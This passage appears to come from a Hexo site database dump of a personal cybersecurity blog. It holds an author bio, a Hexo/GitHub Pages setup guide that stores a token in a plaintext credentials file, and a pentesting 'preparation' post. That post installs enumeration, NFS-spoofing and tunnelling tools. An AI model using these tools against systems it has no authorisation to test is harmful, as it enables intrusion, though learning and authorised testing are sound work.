teaching!</p>\n<br>\n\n<h2 id=\"Socials\"><a href=\"#Socials\" class=\"headerlink\" title=\"Socials\"></a>Socials</h2><p>I try to stay active on various platforms and I am always open to discussions, collaborations, or any form of engagement that propels our mutual growth. Feel free to connect with me through any of the following channels:<br><a href=\"https://www.linkedin.com/in/radumarin001/\" target=\"_blank\"><b>LinkedIn</b></a> | <a href=\"https://discordapp.com/users/602129324136464394\" target=\"_blank\"><b>Discord</b></a> | <a href=\"https://instagram.com/chronos_security\" target=\"_blank\"><b>Instagram</b></a>.</p>\n<p>Also, you can find me on different cybersecurity or IT platforms:<br><a href=\"https://github.com/ChronosPK\" target=\"_blank\"><b>GitHub</b></a> | <a href=\"https://tryhackme.com/p/s.marin.ionut\" target=\"_blank\"><b>TryHackMe</b></a> | <a href=\"https://app.hackthebox.com/profile/691012\" target=\"_blank\"><b>HackTheBox</b></a> | <a href=\"https://play.picoctf.org/users/Radupk\" target=\"_blank\"><b>PicoCTF</b></a> | <a href=\"https://app.cyber-edu.co/user/89f41bb0-25ea-11ec-85ba-b5c17388972b\" target=\"_blank\"><b>CyberEDU</b></a>.</p>\n<p>If needed, reach out via email at <a href=\"mailto:chronos@chronossec.site\"><b>chronos@chronossec.site</b></a>.</p>\n<br>\n<br>\n\n<blockquote>\n<p>Any  actions and or activities related to the material contained within this Website is solely your responsibility.The misuse of the information in this website can result in criminal charges brought against the persons in question. The author of <code>chronossec.site</code> will not be held responsible in the event any criminal charges be brought against any individuals misusing the information in this website to break the law.</p>\n</blockquote>\n<br>\n\n<hr>\n<hr>\n","excerpt":"","more":"<h2 id=\"Intro\"><a href=\"#Intro\" class=\"headerlink\" title=\"Intro\"></a>Intro</h2><p>Hello! My name is <a href=\"https://linkedin.com/in/radumarin001/\" target=\"_blank\"><b>Radu</b></a> and I am an officer in Romanian Army. I recently finished my studies at <a href=\"https://www.armyacademy.ro/\" target=\"_blank\"><b>Nicolae Balcescu Land Forces Academy</b></a> in Sibiu, specializing in military communication, information technology and cyber defense. I embarked on my cybersecurity journey in 2021, driven by a relentless thirst for knowledge, improvement, and a desire to contribute positively to the community.</p>\n<p>At the moment, I am certified with <code>eJPT</code> and aspire to get the <code>OSCP</code> by the end of 2025. I am continually exploring, learning, and sharing insights in the expansive and dynamic realm of cybersecurity.</p>\n<br>\n\n<h2 id=\"2-CTFs\"><a href=\"#2-CTFs\" class=\"headerlink\" title=\"2 CTFs\"></a>2 CTFs</h2><p>My engagement with cybersecurity materialized through organizing Capture The Flag (CTF) competitions, aimed at challenging and educating participants in various aspects of cybersecurity. My inaugural event, <a href=\"/categories/CTFs/SMCC-2023\" target=\"_blank\"><b>Sibiu Military Cyber Challenge 2023</b> (SMCC 2023)</a>, was a beginner-intermediate level CTF designed for my peers in the military academy and high school in Sibiu, Romania.</p>\n<p>Following its success, I created the <a href=\"/categories/CTFs/CSCTF-2024/\" target=\"_blank\"><b>Chronos Security CTF 2024</b> CSCTF 2024</a>, a national competition welcoming participants across all educational levels, from high school to masters degree students, across military and civilian sectors, as well as other interested Romanian participants. The competition is structured to encourage learning, enhance skills, and foster a supportive community environment. This initiative not only served as a significant challenge but also as a comprehensive project for my bachelor thesis.</p>\n<br>\n\n<h2 id=\"Projects\"><a href=\"#Projects\" class=\"headerlink\" title=\"Projects\"></a>Projects</h2><p>From July 2022 to July 2024 I had been developing a website based on <strong>Notion</strong> (awesome note-taking app). There, I posted writeups to CTFs and machines, cheatsheets, learning resources, tricks and tools, scripts, and explained how I created the first CTF, <strong>SMCC 2023</strong>. In the meantime, I also developed a cool script to automate the process of enumeration with <code>terminator</code> (<a href=\"https://github.com/ChronosPk/APET\" target=\"_\">APET</a>), published some <a href=\"https://github.com/ChronosPk/pentesting-cheatsheets\" target=\"_\">pentesting cheatsheets</a>, and some other smaller projects.</p>\n<br>\n\n<h2 id=\"Development\"><a href=\"#Development\" class=\"headerlink\" title=\"Development\"></a>Development</h2><p>In the beginning, I liked every branch or cybersecurity, so I tried to learn everything. This strategy proved inefficient from its early days, after which I started taking predefined learning paths, like the ones offered by THM or Cisco. After <em>many</em> courses, countless studying hours, handful of pwned machines and solved CTF challenges, and whoever knows what else, I might be an advanced script kiddie (<em>everyone in cybersecurity, battling the <a href=\"https://en.wikipedia.org/wiki/Impostor_syndrome\" target=\"_\">impostor syndrome</a></em>).</p>\n<br>\n\n<h2 id=\"Next-steps\"><a href=\"#Next-steps\" class=\"headerlink\" title=\"Next steps\"></a>Next steps</h2><p>Additionally to getting the <code>OSCP</code>, Im committed to creating more engaging and educational CTF competitions, contributing to cybersecurity awareness, and supporting the growth of this vibrant community. Looking forward to more pentesting, awareness and teaching!</p>\n<br>\n\n<h2 id=\"Socials\"><a href=\"#Socials\" class=\"headerlink\" title=\"Socials\"></a>Socials</h2><p>I try to stay active on various platforms and I am always open to discussions, collaborations, or any form of engagement that propels our mutual growth. Feel free to connect with me through any of the following channels:<br><a href=\"https://www.linkedin.com/in/radumarin001/\" target=\"_blank\"><b>LinkedIn</b></a> | <a href=\"https://discordapp.com/users/602129324136464394\" target=\"_blank\"><b>Discord</b></a> | <a href=\"https://instagram.com/chronos_security\" target=\"_blank\"><b>Instagram</b></a>.</p>\n<p>Also, you can find me on different cybersecurity or IT platforms:<br><a href=\"https://github.com/ChronosPK\" target=\"_blank\"><b>GitHub</b></a> | <a href=\"https://tryhackme.com/p/s.marin.ionut\" target=\"_blank\"><b>TryHackMe</b></a> | <a href=\"https://app.hackthebox.com/profile/691012\" target=\"_blank\"><b>HackTheBox</b></a> | <a href=\"https://play.picoctf.org/users/Radupk\" target=\"_blank\"><b>PicoCTF</b></a> | <a href=\"https://app.cyber-edu.co/user/89f41bb0-25ea-11ec-85ba-b5c17388972b\" target=\"_blank\"><b>CyberEDU</b></a>.</p>\n<p>If needed, reach out via email at <a href=\"mailto:chronos@chronossec.site\"><b>chronos@chronossec.site</b></a>.</p>\n<br>\n<br>\n\n<blockquote>\n<p>Any  actions and or activities related to the material contained within this Website is solely your responsibility.The misuse of the information in this website can result in criminal charges brought against the persons in question. The author of <code>chronossec.site</code> will not be held responsible in the event any criminal charges be brought against any individuals misusing the information in this website to break the law.</p>\n</blockquote>\n<br>\n\n<hr>\n<hr>\n"},{"title":"Tags","sort":"name","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: Tags\nsort: name\ntype: \"tags\"\n---","date":"2024-09-23T06:18:55.892Z","updated":"2024-09-23T06:18:55.892Z","path":"tags/index.html","comments":1,"layout":"page","_id":"cm1emkmhh00066gvg3epy2wzk","content":"","excerpt":"","more":""}],"Post":[{"title":"How I created my Hexo blog","toc":true,"_content":"\n---\nHow to create a blog with `hexo` framework, `NexT` theme, version control and host with GitHub, and manage domain with Cloudflare.\n\n---\n<!-- more -->\n\n<br>\n\n## Prerequisites\n`vscode`, `node`, `git`\n\n### 1. On Linux\n\n#### `Git`\n```bash\nsudo apt install -y git gh\n```\n> Go in your GitHub account > Developer settings > Personal access tokens > Tokens (classic) > Generate new token\n```bash git auth\ngit config --global user.email \"your_email@example.com\"\ngit config --global user.name \"your_username\"\n\ngit config --global credential.helper store\n# replace <your-token> with your actual token\necho \"https://<your-token>@github.com\" > ~/.git-credentials\n```\n\n> Create a local repository\n```bash\nmkdir -p ~/GitHub/repo_name\ncd ~/GitHub/repo_name\ngit init\n\n# add files (next step can be done at the end)\n# if using vscode, the application allows you to update the repo in GUI, \n# so the following git steps will not be necessary\ngit add .\ngit commit -m \"Initial commit\"\n\n# My username is ChronosPK\n# my repo name is chronospk.github.io (this is the domain format for github pages)\ngit remote add origin https://github.com/ChronosPK/chronospk.github.io.git\n\ngit push -u origin master\n```\n\n<br>\n\n#### `VS Code`\n```bash Install vscode\nsudo apt install -y code\n```\n\n<br>\n\n#### `Node.js`\n```bash Install node\nsudo apt install -y nodejs npm \nnode -v\nnpm -v\n```\n\n<br>\n\n### 2. On Windows\n\n#### `Git`\n```batch\nREM https://git-scm.com/download/win\nwinget install --id Git.Git -e --source winget \n```\n\n<br>\n\n#### `VS Code`\n```bash\nhttps://code.visualstudio.com/download\n```\n\n<br>\n\n#### `Node`\n```bash\nhttps://phoenixnap.com/kb/install-node-js-npm-on-windows\n```\n\n<br>\n\n## Install `Hexo`\n```bash\nnpm install -g hexo-cli\nhexo -v\n```\n```bash\nnpm install hexo-theme-next\nrm -rf node_modules package*\nhexo config theme next\nhexo generate\nhexo server --debug --port 9000 # test locally\n```\n\n<br>\n\n## Important files\n```bash\n_config.yml\n_config.next.yml\n.github/workflows/hexo-deploy.yml # or whatever name\nCNAME # to tell GitHub pages you have a custom domain (DNS config needed)\n```\n\n<br>\n\n## Deploy\n```bash\nhexo generate \nhexo server --debug --port 9000 # test locally\n```\n```bash\nhexo deploy # the repo needs to be public\n# this will run the github workflow action, which needs to give a running status\n```\n\n<br>\n\n## Configure DNS\nI used Cloudflare, so I went to the DNS dashboard and add the following DNS record:\n- type: `A`\n- name: `@`\n- IPv4: `192.30.252.154` (GitHub)\n- Proxy status: `Proxied`\n\nWait a minute and you should see your website running.\nIf you go to your GitHub page, you should be redirected to the new domain (or subdomain) chosen.\nFor example,<a href=\"https://chronospk.github.io/\" target=\"_\"><code>chronospk.github.io</code></a> redirects to <a href=\"https://chronossec.site/\" target=\"_\"><code>chronossec.site</code></a>.\n\n<br>\n\n---\n---","source":"_posts/Blog/hexo-next-git-pages-cloudflare.md","raw":"---\ntitle: How I created my Hexo blog\ncategories:\n  - Blog\ntags:\n  - Blog\ntoc: true\n---\n\n---\nHow to create a blog with `hexo` framework, `NexT` theme, version control and host with GitHub, and manage domain with Cloudflare.\n\n---\n<!-- more -->\n\n<br>\n\n## Prerequisites\n`vscode`, `node`, `git`\n\n### 1. On Linux\n\n#### `Git`\n```bash\nsudo apt install -y git gh\n```\n> Go in your GitHub account > Developer settings > Personal access tokens > Tokens (classic) > Generate new token\n```bash git auth\ngit config --global user.email \"your_email@example.com\"\ngit config --global user.name \"your_username\"\n\ngit config --global credential.helper store\n# replace <your-token> with your actual token\necho \"https://<your-token>@github.com\" > ~/.git-credentials\n```\n\n> Create a local repository\n```bash\nmkdir -p ~/GitHub/repo_name\ncd ~/GitHub/repo_name\ngit init\n\n# add files (next step can be done at the end)\n# if using vscode, the application allows you to update the repo in GUI, \n# so the following git steps will not be necessary\ngit add .\ngit commit -m \"Initial commit\"\n\n# My username is ChronosPK\n# my repo name is chronospk.github.io (this is the domain format for github pages)\ngit remote add origin https://github.com/ChronosPK/chronospk.github.io.git\n\ngit push -u origin master\n```\n\n<br>\n\n#### `VS Code`\n```bash Install vscode\nsudo apt install -y code\n```\n\n<br>\n\n#### `Node.js`\n```bash Install node\nsudo apt install -y nodejs npm \nnode -v\nnpm -v\n```\n\n<br>\n\n### 2. On Windows\n\n#### `Git`\n```batch\nREM https://git-scm.com/download/win\nwinget install --id Git.Git -e --source winget \n```\n\n<br>\n\n#### `VS Code`\n```bash\nhttps://code.visualstudio.com/download\n```\n\n<br>\n\n#### `Node`\n```bash\nhttps://phoenixnap.com/kb/install-node-js-npm-on-windows\n```\n\n<br>\n\n## Install `Hexo`\n```bash\nnpm install -g hexo-cli\nhexo -v\n```\n```bash\nnpm install hexo-theme-next\nrm -rf node_modules package*\nhexo config theme next\nhexo generate\nhexo server --debug --port 9000 # test locally\n```\n\n<br>\n\n## Important files\n```bash\n_config.yml\n_config.next.yml\n.github/workflows/hexo-deploy.yml # or whatever name\nCNAME # to tell GitHub pages you have a custom domain (DNS config needed)\n```\n\n<br>\n\n## Deploy\n```bash\nhexo generate \nhexo server --debug --port 9000 # test locally\n```\n```bash\nhexo deploy # the repo needs to be public\n# this will run the github workflow action, which needs to give a running status\n```\n\n<br>\n\n## Configure DNS\nI used Cloudflare, so I went to the DNS dashboard and add the following DNS record:\n- type: `A`\n- name: `@`\n- IPv4: `192.30.252.154` (GitHub)\n- Proxy status: `Proxied`\n\nWait a minute and you should see your website running.\nIf you go to your GitHub page, you should be redirected to the new domain (or subdomain) chosen.\nFor example,<a href=\"https://chronospk.github.io/\" target=\"_\"><code>chronospk.github.io</code></a> redirects to <a href=\"https://chronossec.site/\" target=\"_\"><code>chronossec.site</code></a>.\n\n<br>\n\n---\n---","slug":"Blog/hexo-next-git-pages-cloudflare","published":1,"date":"2024-09-23T06:18:55.827Z","updated":"2024-09-23T06:18:55.828Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmh900016gvgdrlt3d3v","content":"<hr>\n<p>How to create a blog with <code>hexo</code> framework, <code>NexT</code> theme, version control and host with GitHub, and manage domain with Cloudflare.</p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"Prerequisites\"><a href=\"#Prerequisites\" class=\"headerlink\" title=\"Prerequisites\"></a>Prerequisites</h2><p><code>vscode</code>, <code>node</code>, <code>git</code></p>\n<h3 id=\"1-On-Linux\"><a href=\"#1-On-Linux\" class=\"headerlink\" title=\"1. On Linux\"></a>1. On Linux</h3><h4 id=\"Git\"><a href=\"#Git\" class=\"headerlink\" title=\"Git\"></a><code>Git</code></h4><pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y git gh</code></pre>\n<blockquote>\n<p>Go in your GitHub account &gt; Developer settings &gt; Personal access tokens &gt; Tokens (classic) &gt; Generate new token</p>\n</blockquote>\n<pre><div class=\"caption\"><span>git auth</span></div><code class=\"highlight bash\">git config --global user.email <span class=\"string\">&quot;your_email@example.com&quot;</span>\ngit config --global user.name <span class=\"string\">&quot;your_username&quot;</span>\n\ngit config --global credential.helper store\n<span class=\"comment\"># replace &lt;your-token&gt; with your actual token</span>\n<span class=\"built_in\">echo</span> <span class=\"string\">&quot;https://&lt;your-token&gt;@github.com&quot;</span> &gt; ~/.git-credentials</code></pre>\n\n<blockquote>\n<p>Create a local repository</p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">mkdir</span> -p ~/GitHub/repo_name\n<span class=\"built_in\">cd</span> ~/GitHub/repo_name\ngit init\n\n<span class=\"comment\"># add files (next step can be done at the end)</span>\n<span class=\"comment\"># if using vscode, the application allows you to update the repo in GUI, </span>\n<span class=\"comment\"># so the following git steps will not be necessary</span>\ngit add .\ngit commit -m <span class=\"string\">&quot;Initial commit&quot;</span>\n\n<span class=\"comment\"># My username is ChronosPK</span>\n<span class=\"comment\"># my repo name is chronospk.github.io (this is the domain format for github pages)</span>\ngit remote add origin https://github.com/ChronosPK/chronospk.github.io.git\n\ngit push -u origin master</code></pre>\n\n<br>\n\n<h4 id=\"VS-Code\"><a href=\"#VS-Code\" class=\"headerlink\" title=\"VS Code\"></a><code>VS Code</code></h4><pre><div class=\"caption\"><span>Install vscode</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y code</code></pre>\n\n<br>\n\n<h4 id=\"Node-js\"><a href=\"#Node-js\" class=\"headerlink\" title=\"Node.js\"></a><code>Node.js</code></h4><pre><div class=\"caption\"><span>Install node</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y nodejs npm \nnode -v\nnpm -v</code></pre>\n\n<br>\n\n<h3 id=\"2-On-Windows\"><a href=\"#2-On-Windows\" class=\"headerlink\" title=\"2. On Windows\"></a>2. On Windows</h3><h4 id=\"Git-1\"><a href=\"#Git-1\" class=\"headerlink\" title=\"Git\"></a><code>Git</code></h4><pre><code class=\"highlight batch\">REM https://git-scm.com/download/win\nwinget install --id Git.Git -e --source winget</code></pre>\n\n<br>\n\n<h4 id=\"VS-Code-1\"><a href=\"#VS-Code-1\" class=\"headerlink\" title=\"VS Code\"></a><code>VS Code</code></h4><pre><code class=\"highlight bash\">https://code.visualstudio.com/download</code></pre>\n\n<br>\n\n<h4 id=\"Node\"><a href=\"#Node\" class=\"headerlink\" title=\"Node\"></a><code>Node</code></h4><pre><code class=\"highlight bash\">https://phoenixnap.com/kb/install-node-js-npm-on-windows</code></pre>\n\n<br>\n\n<h2 id=\"Install-Hexo\"><a href=\"#Install-Hexo\" class=\"headerlink\" title=\"Install Hexo\"></a>Install <code>Hexo</code></h2><pre><code class=\"highlight bash\">npm install -g hexo-cli\nhexo -v</code></pre>\n<pre><code class=\"highlight bash\">npm install hexo-theme-next\n<span class=\"built_in\">rm</span> -rf node_modules package*\nhexo config theme next\nhexo generate\nhexo server --debug --port 9000 <span class=\"comment\"># test locally</span></code></pre>\n\n<br>\n\n<h2 id=\"Important-files\"><a href=\"#Important-files\" class=\"headerlink\" title=\"Important files\"></a>Important files</h2><pre><code class=\"highlight bash\">_config.yml\n_config.next.yml\n.github/workflows/hexo-deploy.yml <span class=\"comment\"># or whatever name</span>\nCNAME <span class=\"comment\"># to tell GitHub pages you have a custom domain (DNS config needed)</span></code></pre>\n\n<br>\n\n<h2 id=\"Deploy\"><a href=\"#Deploy\" class=\"headerlink\" title=\"Deploy\"></a>Deploy</h2><pre><code class=\"highlight bash\">hexo generate \nhexo server --debug --port 9000 <span class=\"comment\"># test locally</span></code></pre>\n<pre><code class=\"highlight bash\">hexo deploy <span class=\"comment\"># the repo needs to be public</span>\n<span class=\"comment\"># this will run the github workflow action, which needs to give a running status</span></code></pre>\n\n<br>\n\n<h2 id=\"Configure-DNS\"><a href=\"#Configure-DNS\" class=\"headerlink\" title=\"Configure DNS\"></a>Configure DNS</h2><p>I used Cloudflare, so I went to the DNS dashboard and add the following DNS record:</p>\n<ul>\n<li>type: <code>A</code></li>\n<li>name: <code>@</code></li>\n<li>IPv4: <code>192.30.252.154</code> (GitHub)</li>\n<li>Proxy status: <code>Proxied</code></li>\n</ul>\n<p>Wait a minute and you should see your website running.<br>If you go to your GitHub page, you should be redirected to the new domain (or subdomain) chosen.<br>For example,<a href=\"https://chronospk.github.io/\" target=\"_\"><code>chronospk.github.io</code></a> redirects to <a href=\"https://chronossec.site/\" target=\"_\"><code>chronossec.site</code></a>.</p>\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>How to create a blog with <code>hexo</code> framework, <code>NexT</code> theme, version control and host with GitHub, and manage domain with Cloudflare.</p>\n<hr>","more":"<br>\n\n<h2 id=\"Prerequisites\"><a href=\"#Prerequisites\" class=\"headerlink\" title=\"Prerequisites\"></a>Prerequisites</h2><p><code>vscode</code>, <code>node</code>, <code>git</code></p>\n<h3 id=\"1-On-Linux\"><a href=\"#1-On-Linux\" class=\"headerlink\" title=\"1. On Linux\"></a>1. On Linux</h3><h4 id=\"Git\"><a href=\"#Git\" class=\"headerlink\" title=\"Git\"></a><code>Git</code></h4><pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y git gh</code></pre>\n<blockquote>\n<p>Go in your GitHub account &gt; Developer settings &gt; Personal access tokens &gt; Tokens (classic) &gt; Generate new token</p>\n</blockquote>\n<pre><div class=\"caption\"><span>git auth</span></div><code class=\"highlight bash\">git config --global user.email <span class=\"string\">&quot;your_email@example.com&quot;</span>\ngit config --global user.name <span class=\"string\">&quot;your_username&quot;</span>\n\ngit config --global credential.helper store\n<span class=\"comment\"># replace &lt;your-token&gt; with your actual token</span>\n<span class=\"built_in\">echo</span> <span class=\"string\">&quot;https://&lt;your-token&gt;@github.com&quot;</span> &gt; ~/.git-credentials</code></pre>\n\n<blockquote>\n<p>Create a local repository</p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">mkdir</span> -p ~/GitHub/repo_name\n<span class=\"built_in\">cd</span> ~/GitHub/repo_name\ngit init\n\n<span class=\"comment\"># add files (next step can be done at the end)</span>\n<span class=\"comment\"># if using vscode, the application allows you to update the repo in GUI, </span>\n<span class=\"comment\"># so the following git steps will not be necessary</span>\ngit add .\ngit commit -m <span class=\"string\">&quot;Initial commit&quot;</span>\n\n<span class=\"comment\"># My username is ChronosPK</span>\n<span class=\"comment\"># my repo name is chronospk.github.io (this is the domain format for github pages)</span>\ngit remote add origin https://github.com/ChronosPK/chronospk.github.io.git\n\ngit push -u origin master</code></pre>\n\n<br>\n\n<h4 id=\"VS-Code\"><a href=\"#VS-Code\" class=\"headerlink\" title=\"VS Code\"></a><code>VS Code</code></h4><pre><div class=\"caption\"><span>Install vscode</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y code</code></pre>\n\n<br>\n\n<h4 id=\"Node-js\"><a href=\"#Node-js\" class=\"headerlink\" title=\"Node.js\"></a><code>Node.js</code></h4><pre><div class=\"caption\"><span>Install node</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y nodejs npm \nnode -v\nnpm -v</code></pre>\n\n<br>\n\n<h3 id=\"2-On-Windows\"><a href=\"#2-On-Windows\" class=\"headerlink\" title=\"2. On Windows\"></a>2. On Windows</h3><h4 id=\"Git-1\"><a href=\"#Git-1\" class=\"headerlink\" title=\"Git\"></a><code>Git</code></h4><pre><code class=\"highlight batch\">REM https://git-scm.com/download/win\nwinget install --id Git.Git -e --source winget</code></pre>\n\n<br>\n\n<h4 id=\"VS-Code-1\"><a href=\"#VS-Code-1\" class=\"headerlink\" title=\"VS Code\"></a><code>VS Code</code></h4><pre><code class=\"highlight bash\">https://code.visualstudio.com/download</code></pre>\n\n<br>\n\n<h4 id=\"Node\"><a href=\"#Node\" class=\"headerlink\" title=\"Node\"></a><code>Node</code></h4><pre><code class=\"highlight bash\">https://phoenixnap.com/kb/install-node-js-npm-on-windows</code></pre>\n\n<br>\n\n<h2 id=\"Install-Hexo\"><a href=\"#Install-Hexo\" class=\"headerlink\" title=\"Install Hexo\"></a>Install <code>Hexo</code></h2><pre><code class=\"highlight bash\">npm install -g hexo-cli\nhexo -v</code></pre>\n<pre><code class=\"highlight bash\">npm install hexo-theme-next\n<span class=\"built_in\">rm</span> -rf node_modules package*\nhexo config theme next\nhexo generate\nhexo server --debug --port 9000 <span class=\"comment\"># test locally</span></code></pre>\n\n<br>\n\n<h2 id=\"Important-files\"><a href=\"#Important-files\" class=\"headerlink\" title=\"Important files\"></a>Important files</h2><pre><code class=\"highlight bash\">_config.yml\n_config.next.yml\n.github/workflows/hexo-deploy.yml <span class=\"comment\"># or whatever name</span>\nCNAME <span class=\"comment\"># to tell GitHub pages you have a custom domain (DNS config needed)</span></code></pre>\n\n<br>\n\n<h2 id=\"Deploy\"><a href=\"#Deploy\" class=\"headerlink\" title=\"Deploy\"></a>Deploy</h2><pre><code class=\"highlight bash\">hexo generate \nhexo server --debug --port 9000 <span class=\"comment\"># test locally</span></code></pre>\n<pre><code class=\"highlight bash\">hexo deploy <span class=\"comment\"># the repo needs to be public</span>\n<span class=\"comment\"># this will run the github workflow action, which needs to give a running status</span></code></pre>\n\n<br>\n\n<h2 id=\"Configure-DNS\"><a href=\"#Configure-DNS\" class=\"headerlink\" title=\"Configure DNS\"></a>Configure DNS</h2><p>I used Cloudflare, so I went to the DNS dashboard and add the following DNS record:</p>\n<ul>\n<li>type: <code>A</code></li>\n<li>name: <code>@</code></li>\n<li>IPv4: <code>192.30.252.154</code> (GitHub)</li>\n<li>Proxy status: <code>Proxied</code></li>\n</ul>\n<p>Wait a minute and you should see your website running.<br>If you go to your GitHub page, you should be redirected to the new domain (or subdomain) chosen.<br>For example,<a href=\"https://chronospk.github.io/\" target=\"_\"><code>chronospk.github.io</code></a> redirects to <a href=\"https://chronossec.site/\" target=\"_\"><code>chronossec.site</code></a>.</p>\n<br>\n\n<hr>\n<hr>"},{"title":"1. Preparation - Linux","date":"2024-08-02T06:00:00.000Z","toc":true,"_content":"\n---\nStep 1 in a penetration test: Preparation.\nInstall the necessary tools, prepare scripts and the working environment.\n\n---\n<!-- more -->\n\n<br>\n\n```bash Create a dedicated directory (stay organized)\nmkdir -p ~/tools\n```\n\n## Pentesting tools\n```bash Impacket scripts\nsudo apt install -y impacket-scripts\n```\n```bash Sublime - text editor\nwget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/sublimehq-archive.gpg > /dev/null\necho \"deb https://download.sublimetext.com/ apt/stable/\" | sudo tee /etc/apt/sources.list.d/sublime-text.list\nsudo apt-get update; sudo apt-get install sublime-text\n```\n```bash if you get an error installing Sublime\nsudo apt-get update && sudo apt-get install libgl1-mesa-dev\n```\n```bash nmapautomator\ngit clone https://github.com/21y4d/nmapAutomator.git ~/tools/nmapAutomator\nsudo cp ~/tools/nmapAutomator/nmapAutomator.sh /usr/local/bin/\nnmapAutomator.sh -h\n```\n```bash terminator - GNOME terminal\nsudo apt install -y terminator\n```\n```bash pspy - view processes\nwget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O ~/tools/pspy64\nwget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 -O ~/tools/pspy32\nchmod +x ~/tools/pspy64 ~/tools/pspy32\nsudo cp ~/tools/pspy64 /usr/local/bin\nsudo cp ~/tools/pspy32 /usr/local/bin\n```\n```bash bbot - recursive internet scanner\ngit clone https://github.com/blacklanternsecurity/bbot ~/tools/bbot\nsudo cp ~/tools/bbot /usr/local/bin\n```\n```bash ftp-user-enum\nwget https://raw.githubusercontent.com/pentestmonkey/ftp-user-enum/master/ftp-user-enum.pl -O ~/tools/ftp-user-enum.pl\nchmod +x ~/tools/ftp-user-enum.pl\nsudo cp ~/tools/ftp-user-enum.pl /usr/local/bin\n```\n```bash smtp-user-enum\nsudo apt install -y smtp-user-enum\n``` swaks\n```bash swaks - Swiss Army Knife for SMTP\nsudo apt-get install swaks\n```\n```bash DNScan\ngit clone https://github.com/rbsec/dnscan.git ~/tools/dnscan\nsudo cp ~/tools/dnscan/dnscan.py /usr/local/bin\n```\n```bash acccheck\nwget http://archive.ubuntu.com/ubuntu/pool/multiverse/a/acccheck/acccheck_0.2.1-3_all.deb -O ~/tools/acccheck.deb\nsudo dpkg -i ~/tools/acccheck.deb\n```\n```bash exportfs\nsudo apt install -y nfs-kernel-server\nexportfs -h\n```\n```bash NfSpy - manipulate UID/GID\ngit clone https://github.com/bonsaiviking/NfSpy.git ~/tools/NfSpy\ncd ~/tools/NfSpy\nsudo python2 setup.py install\npython2 ~/tools/NfSpy/nfspy.py\n```\n```bash scavanger - find interesting files\ngit clone https://github.com/SpiderLabs/scavenger.git ~/tools/scavanger\nchmod +x ~/tools/scavanger/scavenger.py\nsudo cp ~/tools/scavanger/scavenger.py /usr/local/bin\n```\n```bash bpftrace - High-level tracing language for Linux eBPF\nsudo apt-get install -y bpftrace\n```\n```bash ike-scan - discover and fingerprint IKE hosts (IPsec VPN servers)\nsudo apt install ike-scan\n```\n```bash strongswan - IPsec VPN\nsudo apt install strongswan\nsudo nano /etc/ipsec.conf # configure it\nsudo nano /etc/ipsec.secrets # add user creds\n\nipsec up $conn_name\n```\n```bash iis_shortname_scanner\ngit clone https://github.com/lijiejie/IIS_shortname_Scanner.git ~/tools/IIS_shortname_Scanner\n```\n```bash sshpass - parse password in command\n# even though it might be good for automation you type the password\n# and it can be sniffed upon login. \n# Integrating passwords in commands is not a good practice!\nsudo apt install sshpass\n```\n\n\n\n<br>\n\nUse my tool to manage terminals and automate enumeration\n<a href=\"https://github.com/ChronosPk/APET\" target=\"_\">APET (Automate the Process of Enumeration with Terminator)</a>\n\n```bash\nsudo apt install -y git terminator seclists ldap-utils \npython3 -m pip install impacket\n\ngit clone https://github.com/ChronosPK/APET.git\ncd APET\n./apet.sh -h\n```\n\n<br>\n\nCase-insensitive autocomplete (`bash`)\n```bash\necho set completion-ignore-case on | sudo tee -a /etc/inputrc\n```\n\n<br>\n\n## Other tools\n```bash chisel - TCP/UDP tunnel, transported over HTTP, secured via SSH\nsudo apt install -y chisel\n```\n```bash localtunnel - share a local web server online\nnpm install -g localtunnel\nlt --port 8000\n```\n\n<br>\n\n---\n---","source":"_posts/Pentesting/Linux/1.md","raw":"---\ntitle: 1. Preparation - Linux\ndate: 2024-08-02 09:00:00\ncategories:\n  - Pentesting\n  - Linux\ntags:\n  - Pentesting\n  - Linux\n  - Preparation\ntoc: true\n---\n\n---\nStep 1 in a penetration test: Preparation.\nInstall the necessary tools, prepare scripts and the working environment.\n\n---\n<!-- more -->\n\n<br>\n\n```bash Create a dedicated directory (stay organized)\nmkdir -p ~/tools\n```\n\n## Pentesting tools\n```bash Impacket scripts\nsudo apt install -y impacket-scripts\n```\n```bash Sublime - text editor\nwget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/sublimehq-archive.gpg > /dev/null\necho \"deb https://download.sublimetext.com/ apt/stable/\" | sudo tee /etc/apt/sources.list.d/sublime-text.list\nsudo apt-get update; sudo apt-get install sublime-text\n```\n```bash if you get an error installing Sublime\nsudo apt-get update && sudo apt-get install libgl1-mesa-dev\n```\n```bash nmapautomator\ngit clone https://github.com/21y4d/nmapAutomator.git ~/tools/nmapAutomator\nsudo cp ~/tools/nmapAutomator/nmapAutomator.sh /usr/local/bin/\nnmapAutomator.sh -h\n```\n```bash terminator - GNOME terminal\nsudo apt install -y terminator\n```\n```bash pspy - view processes\nwget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O ~/tools/pspy64\nwget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 -O ~/tools/pspy32\nchmod +x ~/tools/pspy64 ~/tools/pspy32\nsudo cp ~/tools/pspy64 /usr/local/bin\nsudo cp ~/tools/pspy32 /usr/local/bin\n```\n```bash bbot - recursive internet scanner\ngit clone https://github.com/blacklanternsecurity/bbot ~/tools/bbot\nsudo cp ~/tools/bbot /usr/local/bin\n```\n```bash ftp-user-enum\nwget https://raw.githubusercontent.com/pentestmonkey/ftp-user-enum/master/ftp-user-enum.pl -O ~/tools/ftp-user-enum.pl\nchmod +x 